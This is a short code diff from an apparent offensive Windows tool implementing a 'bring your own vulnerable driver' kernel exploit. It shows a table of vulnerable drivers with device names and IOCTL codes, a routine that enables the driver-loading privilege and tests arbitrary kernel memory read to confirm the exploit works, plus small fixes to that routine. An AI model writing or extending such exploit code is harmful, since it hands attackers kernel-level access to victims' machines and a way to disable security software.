@@ -6,6 +6,15 @@
 
 namespace l4g::kernel {
 
+static std::string narrow(const wchar_t* wide) {
+    if (!wide) return {};
+    int need = WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
+    if (need <= 1) return {};
+    std::string out((size_t)need - 1, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, wide, -1, out.data(), need, nullptr, nullptr);
+    return out;
+}
+
 const BYOVD::VulnerableDriver BYOVD::VULNERABLE_DRIVERS[] = {
     // Intel Graphics Driver (CVE-2021-0117 style, still works on some versions)
     {L"IntelHDAudio.sys", L"IntelHDAudioService", L"\\\\.\\IntelHDAudio", 0x80002040, 0x80002044, 0x80002048, 0x8, 0x10, 0x30},
@@ -36,7 +45,7 @@ size_t BYOVD::VULNERABLE_COUNT = sizeof(VULNERABLE_DRIVERS) / sizeof(VulnerableD
 BYOVDResult BYOVD::exploit_vulnerable_driver() {
     BYOVDResult result;
     
-    if (!enable_privilege(SE_LOAD_DRIVER_PRIVILEGE)) {
+    if (!enable_privilege(SE_LOAD_DRIVER_NAME)) {
         result.error = "Failed to enable SeLoadDriverPrivilege";
         return result;
     }
@@ -56,7 +65,7 @@ BYOVDResult BYOVD::exploit_vulnerable_driver() {
         if (arbitrary_read(hDevice, drv, 0xFFFFF80000000000, test_val)) {
             result.success = true;
             result.driver_handle = hDevice;
-            result.driver_path = std::string(drv.name, drv.name + wcslen(drv.name));
+            result.driver_path = narrow(drv.name);
             return result;
         }
         
